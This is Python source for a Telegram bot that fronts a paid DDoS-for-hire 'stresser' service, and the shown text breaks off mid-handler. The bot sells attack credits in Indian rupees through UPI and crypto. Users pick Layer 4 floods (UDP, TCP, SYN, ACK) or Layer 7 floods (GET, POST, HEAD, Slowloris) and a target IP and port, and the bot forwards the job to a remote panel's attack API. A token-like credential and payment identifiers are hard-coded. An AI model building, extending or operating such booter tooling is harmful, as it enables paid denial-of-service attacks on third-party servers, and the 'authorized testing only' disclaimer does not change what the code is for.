import asyncio
import logging
import sqlite3
import json
import re
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Any
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, ChatMemberUpdatedFilter, IS_MEMBER, IS_NOT_MEMBER
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberUpdated,
    ReplyKeyboardMarkup, KeyboardButton, BotCommand, Message, CallbackQuery
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramNotFound
import aiohttp

# ============ CONFIGURATION ============
BOT_TOKEN = "7343295464:AAEI8ljgdeC4xSMg7atrJ8ysifQ3WR_6Rcc"
OWNER_ID = 6218253783
OWNER_USERNAME = "@MoinOwner"
LOG_CHANNEL_ID = -1002676634475
REQUIRED_CHANNELS = ["@PYHOSTING0", "@RestrictedXFB"]
PANEL_BASE_URL = "https://retrostress.net"
PANEL_API_ENDPOINT = f"{PANEL_BASE_URL}/panel/api"
SUPPORT_GROUP = "@MoinOwner"

# Payment Configuration (INR)
PAYMENT_METHODS = {
    "upi": "mohd.moin@superyes",
    "qr_code": "https://yourdomain.com/qr.png",
    "crypto": "0xYourCryptoAddress"
}

# Pricing in INR
PRICE_LIST = {
    "basic": {"credits": 100, "price": 500, "name": "Basic Pack"},
    "standard": {"credits": 500, "price": 2000, "name": "Standard Pack"},
    "premium": {"credits": 1000, "price": 3500, "name": "Premium Pack"},
    "unlimited": {"credits": 999999, "price": 10000, "name": "Unlimited Monthly"}
}

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize bot and dispatcher
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ============ DATABASE SYSTEM ============
class Database:
    def __init__(self, db_file: str = "retrostress_bot.db"):
        self.db_file = db_file
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                access_key TEXT,
                credits INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                is_admin INTEGER DEFAULT 0,
                joined_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                total_attacks INTEGER DEFAULT 0
            )
        ''')
        
        # Groups table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS groups (
                group_id INTEGER PRIMARY KEY,
                group_name TEXT,
                added_by INTEGER,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        # Attack logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                target TEXT,
                method TEXT,
                port INTEGER,
                duration INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT,
                response TEXT
            )
        ''')
        
        # Payment logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                package TEXT,
                amount REAL,
                payment_method TEXT,
                transaction_id TEXT,
                status TEXT DEFAULT 'pending',
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                verified_by INTEGER,
                verified_at TIMESTAMP
            )
        ''')
        
        # Settings table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Insert default settings
        default_settings = [
            ("maintenance_mode", "0"),
            ("max_attack_duration", "300"),
            ("min_attack_duration", "30"),
            ("max_concurrent_attacks", "3"),
            ("welcome_message", "Welcome to RETRO//STRESS Bot!"),
            ("owner_contact", OWNER_USERNAME)
        ]
        
        for key, value in default_settings:
            cursor.execute('''
                INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)
            ''', (key, value))
        
        conn.commit()
        conn.close()
        logger.info("Database initialized successfully")
    
    def get_connection(self):
        return sqlite3.connect(self.db_file)
    
    # User methods
    def add_user(self, user_id: int, username: str, first_name: str, last_name: str):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, last_name, last_activity)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, username, first_name, last_name, datetime.now()))
            conn.commit()
        except Exception as e:
            logger.error(f"Error adding user: {e}")
        finally:
            conn.close()
    
    def get_user(self, user_id: int) -> Optional[dict]:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
            columns = [description[0] for description in cursor.description]
            result = cursor.fetchone()
            return dict(zip(columns, result)) if result else None
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
        finally:
            conn.close()
    
    def update_user_key(self, user_id: int, access_key: str):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET access_key = ? WHERE user_id = ?', (access_key, user_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Error updating key: {e}")
        finally:
            conn.close()
    
    def update_credits(self, user_id: int, credits: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET credits = ? WHERE user_id = ?', (credits, user_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Error updating credits: {e}")
        finally:
            conn.close()
    
    def add_credits(self, user_id: int, credits: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (credits, user_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Error adding credits: {e}")
        finally:
            conn.close()
    
    def deduct_credits(self, user_id: int, credits: int) -> bool:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()
            if result and result[0] >= credits:
                cursor.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (credits, user_id))
                conn.commit()
                return True
            return False
        except Exception as e:
            logger.error(f"Error deducting credits: {e}")
            return False
        finally:
            conn.close()
    
    def increment_attacks(self, user_id: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
            conn.commit()
        except Exception as e:
            logger.error(f"Error incrementing attacks: {e}")
        finally:
            conn.close()
    
    def ban_user(self, user_id: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
            conn.commit()
        except Exception as e:
            logger.error(f"Error banning user: {e}")
        finally:
            conn.close()
    
    def unban_user(self, user_id: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
            conn.commit()
        except Exception as e:
            logger.error(f"Error unbanning user: {e}")
        finally:
            conn.close()
    
    def is_banned(self, user_id: int) -> bool:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT is_banned FROM users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()
            return result[0] == 1 if result else False
        except Exception as e:
            logger.error(f"Error checking ban status: {e}")
            return False
        finally:
            conn.close()
    
    def is_admin(self, user_id: int) -> bool:
        if user_id == OWNER_ID:
            return True
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT is_admin FROM users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()
            return result[0] == 1 if result else False
        except Exception as e:
            logger.error(f"Error checking admin status: {e}")
            return False
        finally:
            conn.close()
    
    def set_admin(self, user_id: int, is_admin: bool):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('UPDATE users SET is_admin = ? WHERE user_id = ?', (1 if is_admin else 0, user_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Error setting admin: {e}")
        finally:
            conn.close()
    
    def get_all_users(self) -> list:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT user_id FROM users WHERE is_banned = 0')
            result = cursor.fetchall()
            return [r[0] for r in result]
        except Exception as e:
            logger.error(f"Error getting users: {e}")
            return []
        finally:
            conn.close()
    
    # Group methods
    def add_group(self, group_id: int, group_name: str, added_by: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO groups (group_id, group_name, added_by)
                VALUES (?, ?, ?)
            ''', (group_id, group_name, added_by))
            conn.commit()
        except Exception as e:
            logger.error(f"Error adding group: {e}")
        finally:
            conn.close()
    
    def remove_group(self, group_id: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('DELETE FROM groups WHERE group_id = ?', (group_id,))
            conn.commit()
        except Exception as e:
            logger.error(f"Error removing group: {e}")
        finally:
            conn.close()
    
    def get_all_groups(self) -> list:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT * FROM groups WHERE is_active = 1')
            columns = [description[0] for description in cursor.description]
            groups = [dict(zip(columns, row)) for row in cursor.fetchall()]
            return groups
        except Exception as e:
            logger.error(f"Error getting groups: {e}")
            return []
        finally:
            conn.close()
    
    # Attack logging
    def log_attack(self, user_id: int, target: str, method: str, port: int, duration: int, status: str, response: str = ""):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO attack_logs (user_id, target, method, port, duration, status, response)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (user_id, target, method, port, duration, status, response))
            conn.commit()
        except Exception as e:
            logger.error(f"Error logging attack: {e}")
        finally:
            conn.close()
    
    # Payment methods
    def add_payment(self, user_id: int, package: str, amount: float, payment_method: str, transaction_id: str):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO payments (user_id, package, amount, payment_method, transaction_id)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, package, amount, payment_method, transaction_id))
            conn.commit()
            payment_id = cursor.lastrowid
            return payment_id
        except Exception as e:
            logger.error(f"Error adding payment: {e}")
            return None
        finally:
            conn.close()
    
    def verify_payment(self, payment_id: int, verified_by: int):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                UPDATE payments SET status = 'verified', verified_by = ?, verified_at = ?
                WHERE id = ?
            ''', (verified_by, datetime.now(), payment_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Error verifying payment: {e}")
        finally:
            conn.close()
    
    def get_pending_payments(self) -> list:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT * FROM payments WHERE status = "pending"')
            columns = [description[0] for description in cursor.description]
            payments = [dict(zip(columns, row)) for row in cursor.fetchall()]
            return payments
        except Exception as e:
            logger.error(f"Error getting payments: {e}")
            return []
        finally:
            conn.close()
    
    # Settings
    def get_setting(self, key: str, default: str = "") -> str:
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
            result = cursor.fetchone()
            return result[0] if result else default
        except Exception as e:
            logger.error(f"Error getting setting: {e}")
            return default
        finally:
            conn.close()
    
    def set_setting(self, key: str, value: str):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO settings (key, value, updated_at)
                VALUES (?, ?, ?)
            ''', (key, value, datetime.now()))
            conn.commit()
        except Exception as e:
            logger.error(f"Error setting setting: {e}")
        finally:
            conn.close()

db = Database()

# ============ STATE CLASSES ============
class UserStates(StatesGroup):
    waiting_for_key = State()
    waiting_for_attack_target = State()
    waiting_for_attack_duration = State()
    waiting_for_payment_screenshot = State()
    waiting_for_transaction_id = State()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_user_id_ban = State()
    waiting_for_user_id_unban = State()
    waiting_for_admin_id = State()
    waiting_for_group_id = State()
    waiting_for_payment_verification = State()
    waiting_for_add_credits_user = State()
    waiting_for_add_credits_amount = State()

# ============ KEYBOARD MARKUPS ============
def main_menu(user_id: int):
    buttons = [
        [InlineKeyboardButton(text="🔑 Set Access Key", callback_data="set_key")],
        [InlineKeyboardButton(text="📊 My Status", callback_data="my_status")],
        [InlineKeyboardButton(text="🚀 Launch Attack", callback_data="launch_attack")],
        [InlineKeyboardButton(text="💰 Buy Credits (INR)", callback_data="buy_credits")],
        [InlineKeyboardButton(text="📞 Contact Owner", callback_data="contact_owner")],
        [InlineKeyboardButton(text="❓ Help & Rules", callback_data="help")]
    ]
    
    if db.is_admin(user_id):
        buttons.append([InlineKeyboardButton(text="⚙️ Admin Panel", callback_data="admin_panel")])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def attack_type_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚡ Layer 4 (UDP/TCP)", callback_data="attack_l4")],
        [InlineKeyboardButton(text="🌐 Layer 7 (HTTP)", callback_data="attack_l7")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ])

def l4_methods_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="UDP Flood", callback_data="method_udp")],
        [InlineKeyboardButton(text="TCP Flood", callback_data="method_tcp")],
        [InlineKeyboardButton(text="SYN Flood", callback_data="method_syn")],
        [InlineKeyboardButton(text="ACK Flood", callback_data="method_ack")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="launch_attack")]
    ])

def l7_methods_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="GET Flood", callback_data="method_get")],
        [InlineKeyboardButton(text="POST Flood", callback_data="method_post")],
        [InlineKeyboardButton(text="HEAD Flood", callback_data="method_head")],
        [InlineKeyboardButton(text="Slowloris", callback_data="method_slowloris")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="launch_attack")]
    ])

def duration_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="60 seconds (10 credits)", callback_data="dur_60")],
        [InlineKeyboardButton(text="120 seconds (20 credits)", callback_data="dur_120")],
        [InlineKeyboardButton(text="300 seconds (50 credits)", callback_data="dur_300")],
        [InlineKeyboardButton(text="Custom", callback_data="dur_custom")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="launch_attack")]
    ])

def payment_menu():
    buttons = []
    for key, value in PRICE_LIST.items():
        buttons.append([InlineKeyboardButton(
            text=f"{value['name']} - ₹{value['price']} ({value['credits']} credits)",
            callback_data=f"buy_{key}"
        )])
    buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_menu(package: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 UPI Payment", callback_data=f"pay_upi_{package}")],
        [InlineKeyboardButton(text="₿ Cryptocurrency", callback_data=f"pay_crypto_{package}")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="buy_credits")]
    ])

def admin_panel_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 User Management", callback_data="admin_users")],
        [InlineKeyboardButton(text="💰 Payment Verification", callback_data="admin_payments")],
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="📊 Statistics", callback_data="admin_stats")],
        [InlineKeyboardButton(text="⚙️ Settings", callback_data="admin_settings")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ])

def admin_user_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Ban User", callback_data="admin_ban_user")],
        [InlineKeyboardButton(text="✅ Unban User", callback_data="admin_unban_user")],
        [InlineKeyboardButton(text="➕ Add Admin", callback_data="admin_add_admin")],
        [InlineKeyboardButton(text="➖ Remove Admin", callback_data="admin_remove_admin")],
        [InlineKeyboardButton(text="💰 Add Credits", callback_data="admin_add_credits")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin_panel")]
    ])

def back_button():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])

def contact_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📞 Telegram Owner", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")],
        [InlineKeyboardButton(text="💬 Support Group", url=SUPPORT_GROUP)],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ])

# ============ HELPER FUNCTIONS ============
async def check_membership(user_id: int) -> bool:
    """Check if user joined all required channels"""
    try:
        for channel in REQUIRED_CHANNELS:
            try:
                member = await bot.get_chat_member(channel, user_id)
                if member.status in ['left', 'kicked']:
                    return False
            except Exception as e:
                logger.error(f"Error checking {channel}: {e}")
                return False
        return True
    except Exception as e:
        logger.error(f"Membership check error: {e}")
        return False

def calculate_attack_cost(duration: int) -> int:
    """Calculate attack cost in credits"""
    return max(10, duration // 6)  # 10 credits per 60 seconds

async def log_to_channel(text: str):
    """Log important events to channel"""
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed to log to channel: {e}")

# ============ PANEL API INTEGRATION ============
class PanelAPI:
    def __init__(self, base_url: str):
        self.base_url = base_url
    
    async def validate_key(self, access_key: str) -> bool:
        """Validate access key with panel"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/api/check-key",
                    json={"key": access_key},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get("valid", False)
                    return False
        except Exception as e:
            logger.error(f"Key validation error: {e}")
            return False
    
    async def launch_attack(self, access_key: str, target: str, method: str, 
                         port: int, duration: int) -> dict:
        """Launch attack via panel API"""
        try:
            payload = {
                "key": access_key,
                "target": target,
                "method": method,
                "port": port,
                "duration": duration
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/api/attack",
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    data = await response.json()
                    return {
                        "success": response.status == 200,
                        "data": data,
                        "status_code": response.status
                    }
        except Exception as e:
            logger.error(f"Attack launch error: {e}")
            return {"success": False, "error": str(e)}
    
    async def get_status(self, access_key: str) -> dict:
        """Get panel status"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.base_url}/api/status",
                    headers={"Authorization": f"Bearer {access_key}"},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {"error": f"Status code: {response.status}"}
        except Exception as e:
            logger.error(f"Status check error: {e}")
            return {"error": str(e)}

panel_api = PanelAPI(PANEL_BASE_URL)

# ============ COMMAND HANDLERS ============
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    try:
        await state.clear()
        user = message.from_user
        
        # Add user to database
        db.add_user(user.id, user.username, user.first_name, user.last_name)
        
        # Check if banned
        if db.is_banned(user.id):
            await message.answer("🚫 You have been banned from using this bot.")
            return
        
        # Check channel membership
        if not await check_membership(user.id):
            channels_text = "\n".join([f"• {ch}" for ch in REQUIRED_CHANNELS])
            await message.answer(
                f"👋 Welcome to **RETRO//STRESS** Bot!\n\n"
                f"⚠️ To use this bot, please join our official channels:\n"
                f"{channels_text}\n\n"
                f"✅ Join all channels above\n"
                f"🔄 Then click /start again",
                parse_mode="Markdown"
            )
            return
        
        # Check maintenance mode
        maintenance = db.get_setting("maintenance_mode", "0")
        if maintenance == "1" and not db.is_admin(user.id):
            await message.answer(
                "🔧 Bot is under maintenance. Please try again later.\n"
                f"Contact {OWNER_USERNAME} for urgent issues."
            )
            return
        
        welcome_text = (
            f"👋 Welcome, {user.first_name}!\n\n"
            f"🤖 **RETRO//STRESS** - Ultimate Stress Testing Panel\n\n"
            f"💥 **Features:**\n"
            f"• Layer 4 & Layer 7 Attacks\n"
            f"• High Performance Servers\n"
            f"• INR Payment Support\n"
            f"• 24/7 Support\n\n"
            f"💰 **Pricing (INR):**\n"
            f"• 100 credits - ₹500\n"
            f"• 500 credits - ₹2000\n"
            f"• 1000 credits - ₹3500\n"
            f"• Unlimited - ₹10000/month\n\n"
            f"⚠️ **Disclaimer:**\n"
            f"For authorized security testing only!\n\n"
            f"Use the menu below:"
        )
        
        await message.answer(welcome_text, reply_markup=main_menu(user.id), parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await message.answer("❌ An error occurred. Please try again.")

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    try:
        help_text = (
            "📖 **Bot Commands:**\n\n"
            "/start - Start the bot\n"
            "/setkey <key> - Set your panel access key\n"
            "/status - Check your account status\n"
            "/attack - Launch attack menu\n"
            "/buy - Purchase credits (INR)\n"
            "/contact - Contact owner\n"
            "/help - Show this help\n\n"
            "👑 **Admin Commands:**\n"
            "/admin - Admin panel\n"
            "/ban <user_id> - Ban user\n"
            "/unban <user_id> - Unban user\n"
            "/addadmin <user_id> - Add admin\n"
            "/broadcast <msg> - Send message to all\n\n"
            "⚠️ **Rules:**\n"
            "• Only attack authorized targets\n"
            "• No government/educational sites\n"
            "• Violations = permanent ban"
        )
        await message.answer(help_text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error in help command: {e}")

@dp.message(Command("setkey"))
async def cmd_setkey(message: types.Message, state: FSMContext):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.answer(
                "❌ Please provide your access key.\n"
                "Usage: `/setkey YOUR_ACCESS_KEY`",
                parse_mode="Markdown"
            )
            return
        
        access_key = args[1].strip()
        user_id = message.from_user.id
        
        # Validate key with panel
        msg = await message.answer("🔐 Validating your access key...")
        
        is_valid = await panel_api.validate_key(access_key)
        
        if is_valid:
            db.update_user_key(user_id, access_key)
            await msg.edit_text(
                "✅ Access key validated and saved successfully!\n\n"
                "🔒 Your key is now securely stored.\n"
                "You can now launch attacks.",
                reply_markup=main_menu(user_id)
            )
        else:
            await msg.edit_text(
                "❌ Invalid access key!\n\n"
                "Please check your key and try again.\n"
                f"Contact {OWNER_USERNAME} if you need help.",
                reply_markup=main_menu(user_id)
            )
    except Exception as e:
        logger.error(f"Error in setkey command: {e}")
        await message.answer("❌ An error occurred. Please try again.")

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    try:
        user_id = message.from_user.id
        user_data = db.get_user(user_id)
        
        if not user_data:
            await message.answer("❌ User not found. Please start the bot with /start")
            return
        
        # Get attack stats
        conn = sqlite3.connect("retrostress_bot.db")
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM attack_logs WHERE user_id = ?', (user_id,))
        total_attacks = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM attack_logs WHERE user_id = ? AND timestamp >= date("now", "-1 day")', (user_id,))
        today_attacks = cursor.fetchone()[0]
        conn.close()
        
        status_text = (
            f"📊 **Your Account Status**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"💰 Credits: {user_data['credits']}\n"
            f"⭐ Premium: {'Yes' if user_data['is_premium'] else 'No'}\n"
            f"🔰 Admin: {'Yes' if user_data['is_admin'] else 'No'}\n"
            f"📅 Joined: {user_data['joined_date']}\n\n"
            f"💥 **Attack Stats:**\n"
            f"• Total: {total_attacks}\n"
            f"• Today: {today_attacks}\n\n"
            f"🔑 Key Status: {'Set' if user_data['access_key'] else 'Not Set'}"
        )
        
        await message.answer(status_text, parse_mode="Markdown", reply_markup=back_button())
    except Exception as e:
        logger.error(f"Error in status command: {e}")
        await message.answer("❌ An error occurred. Please try again.")

@dp.message(Command("attack"))
async def cmd_attack(message: types.Message):
    try:
        await message.answer(
            "🚀 **Launch Attack**\n\n"
            "Select attack type:",
            reply_markup=attack_type_menu()
        )
    except Exception as e:
        logger.error(f"Error in attack command: {e}")

@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    try:
        await message.answer(
            "💰 **Purchase Credits (INR)**\n\n"
            "Select your package:",
            reply_markup=payment_menu()
        )
    except Exception as e:
        logger.error(f"Error in buy command: {e}")

@dp.message(Command("contact"))
async def cmd_contact(message: types.Message):
    try:
        await message.answer(
            "📞 **Contact Owner**\n\n"
            "Choose how you want to contact us:",
            reply_markup=contact_menu()
        )
    except Exception as e:
        logger.error(f"Error in contact command: {e}")

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    try:
        if not db.is_admin(message.from_user.id):
            await message.answer("❌ You don't have permission to access admin panel.")
            return
        
        await message.answer(
            "⚙️ **Admin Panel**\n\n"
            "Select an option:",
            reply_markup=admin_panel_menu()
        )
    except Exception as e:
        logger.error(f"Error in admin command: {e}")

# ============ CALLBACK HANDLERS - MAIN MENU ============
@dp.callback_query(F.data == "main_menu")
async def process_main_menu(callback: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await callback.message.edit_text(
            "👋 Welcome back! Select an option:",
            reply_markup=main_menu(callback.from_user.id)
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in main_menu callback: {e}")
        await callback.answer("Error occurred", show_alert=True)

@dp.callback_query(F.data == "set_key")
async def process_set_key(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            "🔑 **Set Access Key**\n\n"
            "Please send your panel access key.\n\n"
            "Usage: `/setkey YOUR_KEY`",
            reply_markup=back_button(),
            parse_mode="Markdown"
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in set_key callback: {e}")

@dp.callback_query(F.data == "my_status")
async def process_my_status(callback: types.CallbackQuery):
    try:
        await cmd_status(callback.message)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in my_status callback: {e}")

@dp.callback_query(F.data == "launch_attack")
async def process_launch_attack(callback: types.CallbackQuery):
    try:
        user_id = callback.from_user.id
        user_data = db.get_user(user_id)
        
        if not user_data or not user_data['access_key']:
            await callback.message.edit_text(
                "❌ Please set your access key first!\n\n"
                "Use the button below to set your key:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔑 Set Access Key", callback_data="set_key")],
                    [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
                ])
            )
            await callback.answer()
            return
        
        if user_data['credits'] <= 0:
            await callback.message.edit_text(
                "❌ You don't have enough credits!\n\n"
                "Please purchase credits to launch attacks.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💰 Buy Credits", callback_data="buy_credits")],
                    [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
                ])
            )
            await callback.answer()
            return
        
        await callback.message.edit_text(
            "🚀 **Launch Attack**\n\n"
            "Select attack type:",
            reply_markup=attack_type_menu()
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in launch_attack callback: {e}")

@dp.callback_query(F.data == "buy_credits")
async def process_buy_credits(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            "💰 **Purchase Credits (INR)**\n\n"
            "Select your package:\n\n"
            "🇮🇳 **Indian Rupee (INR) Payment**\n"
            "• UPI Accepted\n"
            "• Cryptocurrency Accepted\n\n"
            "After payment, your credits will be added within 15 minutes.",
            reply_markup=payment_menu()
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in buy_credits callback: {e}")

@dp.callback_query(F.data == "contact_owner")
async def process_contact_owner(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            f"📞 **Contact Owner**\n\n"
            f"👤 Owner: {OWNER_USERNAME}\n"
            f"💬 Support: {SUPPORT_GROUP}\n\n"
            f"For payment issues, contact immediately after payment.",
            reply_markup=contact_menu()
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in contact_owner callback: {e}")

@dp.callback_query(F.data == "help")
async def process_help(callback: types.CallbackQuery):
    try:
        await cmd_help(callback.message)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in help callback: {e}")

# ============ CALLBACK HANDLERS - ATTACK SYSTEM ============
@dp.callback_query(F.data.in_(["attack_l4", "attack_l7"]))
async def process_attack_type(callback: types.CallbackQuery, state: FSMContext):
    try:
        attack_type = "L4" if callback.data == "attack_l4" else "L7"
        await state.update_data(attack_type=attack_type)
        
        if attack_type == "L4":
            await callback.message.edit_text(
                "⚡ **Layer 4 Attack**\n\n"
                "Select attack method:",
                reply_markup=l4_methods_menu()
            )
        else:
            await callback.message.edit_text(
                "🌐 **Layer 7 Attack**\n\n"
                "Select attack method:",
                reply_markup=l7_methods_menu()
            )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in attack_type callback: {e}")

@dp.callback_query(F.data.startswith("method_"))
async def process_method(callback: types.CallbackQuery, state: FSMContext):
    try:
        method = callback.data.replace("method_", "").upper()
        await state.update_data(method=method)
        
        data = await state.get_data()
        attack_type = data.get("attack_type")
        
        if attack_type == "L4":
            await callback.message.edit_text(
                f"✅ Method: **{method}**\n\n"
                f"🎯 Enter target in format:\n"
                f"`IP:PORT`\n\n"
                f"Example: `192.168.1.1:80`",
                reply_markup=back_button(),
                parse_mode="Markdown"
            )
        else:
            await callback.message.edit_text(
